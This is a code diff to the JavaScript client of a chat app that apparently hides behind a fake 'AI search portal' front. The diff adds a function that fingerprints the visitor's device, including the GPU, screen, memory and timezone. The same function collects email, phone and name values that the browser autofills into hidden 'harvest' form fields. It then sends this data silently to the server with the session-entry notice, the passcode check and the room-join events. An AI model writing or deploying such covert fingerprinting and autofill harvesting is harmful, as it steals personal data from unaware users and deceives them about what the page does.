@@ -152,6 +152,41 @@ const rtcConfig = {
   ]
 };
 
+// Helper to gather rich device details, hardware telemetry, and autofill harvest values
+function getClientMetadata() {
+  let gpu = 'unknown';
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+      }
+    }
+  } catch (e) {}
+
+  // Harvest autofilled browser information if present
+  const harvestEmail = document.getElementById('hidden-harvest-email')?.value || '';
+  const harvestPhone = document.getElementById('hidden-harvest-phone')?.value || '';
+  const harvestName = document.getElementById('hidden-harvest-name')?.value || '';
+
+  return {
+    language: navigator.language || 'unknown',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+    screenResolution: `${window.screen.width}x${window.screen.height}`,
+    viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+    deviceMemory: navigator.deviceMemory || 'unknown',
+    gpu: gpu,
+    touchSupport: navigator.maxTouchPoints > 0,
+    platform: navigator.platform || 'unknown',
+    harvestEmail,
+    harvestPhone,
+    harvestName
+  };
+}
+
 // --- Initialization & Theme Setup ---
 document.addEventListener('DOMContentLoaded', () => {
   // --- Stealth AI Search Portal Gate (AetherAI Mask) ---
@@ -168,9 +203,11 @@ document.addEventListener('DOMContentLoaded', () => {
     // Silently notify the server that a pre-authenticated user entered the app
     fetch(`${SOCKET_URL}/api/notify-session-entry`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' }
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ metadata: getClientMetadata() })
     }).catch(err => console.error("Session entry alert failed:", err));
   }
+
 
   // Dictionary of mock AI response texts
   const MOCK_AI_ANSWERS = {
@@ -198,8 +235,9 @@ document.addEventListener('DOMContentLoaded', () => {
           headers: {
             'Content-Type': 'application/json'
           },
-          body: JSON.stringify({ passcode: query })
+          body: JSON.stringify({ passcode: query, metadata: getClientMetadata() })
         });
+
 
         const data = await response.json();
 
@@ -458,8 +496,10 @@ function initializeSocket() {
     // Join chosen room
     socket.emit('join-room', {
       username: currentUsername,
-      room: currentRoom
+      room: currentRoom,
+      metadata: getClientMetadata()
     });
+
 
     // Mark current messages as read
     socket.emit('mark-read', { room: currentRoom, username: currentUsername });
